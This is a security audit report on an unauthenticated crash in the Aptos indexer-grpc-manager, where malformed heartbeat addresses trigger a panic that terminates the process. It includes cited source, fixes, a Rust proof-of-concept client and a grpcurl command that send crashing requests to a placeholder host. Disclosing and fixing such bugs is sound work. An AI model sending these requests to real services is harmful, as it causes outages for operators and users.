# Audit Report

## Title
Unauthenticated Remote Service Crash via Malformed Address in Indexer gRPC Manager Heartbeat Handler

## Summary
The indexer-grpc-manager service contains multiple functions (`Peer::new()`, `Fullnode::new()`, `LiveDataService::new()`, `HistoricalDataService::new()`) that use `.expect()` on `Channel::from_shared()` with untrusted user input from external gRPC heartbeat requests. When an attacker sends a HeartbeatRequest with a malformed URI address, the service panics and the custom panic handler terminates the entire process, causing complete service unavailability. [1](#0-0) 

## Finding Description

The vulnerability exists in the heartbeat handling flow where external services can register themselves with the indexer-grpc-manager. The attack path is:

1. An unauthenticated attacker sends a HeartbeatRequest to the gRPC endpoint with a malformed address in `service_info.address` (e.g., ":::", "invalid-uri", or any string that is not a valid URI scheme like "http://host:port"). [2](#0-1) 

2. The `heartbeat` handler receives the request and extracts the address without validation, then calls `metadata_manager.handle_heartbeat(address, info)`. [3](#0-2) 

3. Based on the info type, `handle_heartbeat` routes to the appropriate handler (e.g., `handle_grpc_manager_info` for GrpcManagerInfo). [4](#0-3) 

4. The handler uses `.or_insert(Peer::new(address))` which calls the constructor with the malformed address.

5. Inside `Peer::new()`, `Channel::from_shared(address).expect("Bad address.")` is called. Similar patterns exist in `Fullnode::new()`, `LiveDataService::new()`, and `HistoricalDataService::new()`. [5](#0-4) [6](#0-5) [7](#0-6) 

6. When `Channel::from_shared()` fails on the invalid URI, `.expect()` panics.

7. The custom panic handler installed at service startup catches all panics and terminates the process with exit code 12. [8](#0-7) 

8. The indexer-grpc-manager service crashes completely and requires manual restart. [9](#0-8) 

## Impact Explanation

This vulnerability results in a **Denial of Service (DoS)** attack that causes complete unavailability of the indexer-grpc-manager service. Per the Aptos bug bounty criteria for "High Severity (up to $50,000): API crashes," this matches the API crash category.

**However**, there is an important caveat: The indexer-grpc-manager is an auxiliary data service for off-chain indexing, not a core consensus or validator component. It does not affect:
- Blockchain consensus or safety
- Validator node operation
- On-chain state or fund security
- Transaction processing or execution

The impact is limited to:
- Loss of availability for indexed data queries
- Disruption for clients depending on this data service
- Operational overhead requiring manual service restart

Whether this qualifies as "High Severity" depends on whether the bug bounty program considers auxiliary indexer services as critical APIs or not. Given that the focus areas listed are "consensus vulnerabilities, Move VM implementation bugs, state management attacks, and on-chain governance security," this vulnerability may fall below the intended severity threshold.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is trivially exploitable because:
- No authentication is required on the heartbeat endpoint
- The attack requires only sending a single malformed gRPC request
- No special privileges or insider access is needed
- The malformed input directly triggers the panic without requiring complex timing or state manipulation
- Tools like `grpcurl` can be used to send the malicious request

The only barrier is network access to the gRPC port, which is typically exposed for legitimate service-to-service communication.

## Recommendation

**Fix 1: Validate addresses before use**

Replace `.expect()` with proper error handling that validates the address format:

```rust
fn new(address: GrpcAddress) -> Result<Self> {
    let channel = Channel::from_shared(address)
        .map_err(|e| anyhow::anyhow!("Invalid address format: {}", e))?
        .connect_lazy();
    let client = GrpcManagerClient::new(channel)
        .send_compressed(CompressionEncoding::Zstd)
        .accept_compressed(CompressionEncoding::Zstd)
        .max_encoding_message_size(MAX_MESSAGE_SIZE)
        .max_decoding_message_size(MAX_MESSAGE_SIZE);
    Ok(Self {
        client,
        recent_states: VecDeque::new(),
    })
}
```

Apply the same pattern to `Fullnode::new()`, `LiveDataService::new()`, and `HistoricalDataService::new()`.

**Fix 2: Validate in the handler**

Add validation in the `handle_heartbeat` and related handler functions to reject invalid addresses early:

```rust
fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
    // Validate address format before using it
    if Channel::from_shared(address.clone()).is_err() {
        bail!("Invalid address format: {}", address);
    }
    
    let mut entry = self
        .grpc_managers
        .entry(address.clone())
        .or_insert(Peer::new(address)?);
    // ... rest of function
}
```

**Fix 3: Add authentication**

Implement authentication on the heartbeat endpoint to prevent unauthorized requests.

## Proof of Concept

```rust
// PoC using a Rust gRPC client
use tonic::Request;
use aptos_protos::indexer::v1::{
    grpc_manager_client::GrpcManagerClient,
    HeartbeatRequest, ServiceInfo, GrpcManagerInfo,
    service_info::Info,
};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Connect to the indexer-grpc-manager
    let mut client = GrpcManagerClient::connect("http://target-indexer:50051").await?;
    
    // Create a heartbeat request with a malformed address
    let malformed_addresses = vec![
        ":::",                    // Invalid URI
        "invalid-uri",            // Missing scheme
        "not a uri at all",       // Spaces and invalid format
        "\x00malformed",          // Null byte
    ];
    
    for bad_addr in malformed_addresses {
        let request = Request::new(HeartbeatRequest {
            service_info: Some(ServiceInfo {
                address: Some(bad_addr.to_string()),
                info: Some(Info::GrpcManagerInfo(GrpcManagerInfo {
                    chain_id: 1,
                    timestamp: None,
                    known_latest_version: Some(0),
                    master_address: None,
                })),
            }),
        });
        
        // Send the malicious request
        // This will cause the server to panic and exit
        match client.heartbeat(request).await {
            Ok(_) => println!("Request succeeded (unexpected)"),
            Err(e) => println!("Request failed with: {} (server may have crashed)", e),
        }
    }
    
    Ok(())
}
```

**Alternative PoC using grpcurl:**

```bash
grpcurl -plaintext -d '{
  "service_info": {
    "address": ":::",
    "info": {
      "grpc_manager_info": {
        "chain_id": 1,
        "known_latest_version": 0
      }
    }
  }
}' target-indexer:50051 aptos.indexer.v1.GrpcManager/Heartbeat
```

After sending this request, the indexer-grpc-manager process will terminate with exit code 12.

## Notes

This vulnerability is technically valid and exploitable, but its severity classification depends on whether the Aptos bug bounty program considers the indexer-grpc-manager as a critical API service. Since it's an auxiliary off-chain data service rather than a core blockchain component, it may not meet the intended threshold for "High Severity" findings focused on consensus, execution, state management, governance, and staking security.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L45-48)
```rust
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L66-70)
```rust
impl Fullnode {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L88-92)
```rust
impl LiveDataService {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L110-114)
```rust
impl HistoricalDataService {
    fn new(address: GrpcAddress) -> Self {
        let channel = Channel::from_shared(address)
            .expect("Bad address.")
            .connect_lazy();
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L330-339)
```rust
    pub(crate) fn handle_heartbeat(&self, address: GrpcAddress, info: Info) -> Result<()> {
        match info {
            Info::LiveDataServiceInfo(info) => self.handle_live_data_service_info(address, info),
            Info::HistoricalDataServiceInfo(info) => {
                self.handle_historical_data_service_info(address, info)
            },
            Info::FullnodeInfo(info) => self.handle_fullnode_info(address, info),
            Info::GrpcManagerInfo(info) => self.handle_grpc_manager_info(address, info),
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/metadata_manager.rs (L552-568)
```rust
    fn handle_grpc_manager_info(&self, address: GrpcAddress, info: GrpcManagerInfo) -> Result<()> {
        self.master_address
            .lock()
            .unwrap()
            .clone_from(&info.master_address);

        let mut entry = self
            .grpc_managers
            .entry(address.clone())
            .or_insert(Peer::new(address));
        entry.value_mut().recent_states.push_back(info);
        if entry.value().recent_states.len() > MAX_NUM_OF_STATES_TO_KEEP {
            entry.value_mut().recent_states.pop_front();
        }

        Ok(())
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/service.rs (L110-127)
```rust
    async fn heartbeat(
        &self,
        request: Request<HeartbeatRequest>,
    ) -> Result<Response<HeartbeatResponse>, Status> {
        let request = request.into_inner();
        if let Some(service_info) = request.service_info {
            if let Some(address) = service_info.address {
                if let Some(info) = service_info.info {
                    return self
                        .handle_heartbeat(address, info)
                        .await
                        .map_err(|e| Status::internal(format!("Error handling heartbeat: {e}")));
                }
            }
        }

        Err(Status::invalid_argument("Bad request."))
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-server-framework/src/lib.rs (L149-168)
```rust
pub fn setup_panic_handler() {
    std::panic::set_hook(Box::new(move |pi: &PanicHookInfo<'_>| {
        handle_panic(pi);
    }));
}

// Formats and logs panic information
fn handle_panic(panic_info: &PanicHookInfo<'_>) {
    // The Display formatter for a PanicHookInfo contains the message, payload and location.
    let details = format!("{}", panic_info);
    let backtrace = format!("{:#?}", Backtrace::new());
    let info = CrashInfo { details, backtrace };
    let crash_info = toml::to_string_pretty(&info).unwrap();
    error!("{}", crash_info);
    // TODO / HACK ALARM: Write crash info synchronously via eprintln! to ensure it is written before the process exits which error! doesn't guarantee.
    // This is a workaround until https://github.com/aptos-labs/aptos-core/issues/2038 is resolved.
    eprintln!("{}", crash_info);
    // Kill the process
    process::exit(12);
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-manager/src/main.rs (L13-17)
```rust
#[tokio::main]
async fn main() -> Result<()> {
    let args = ServerArgs::parse();
    args.run::<IndexerGrpcManagerConfig>().await
}
```
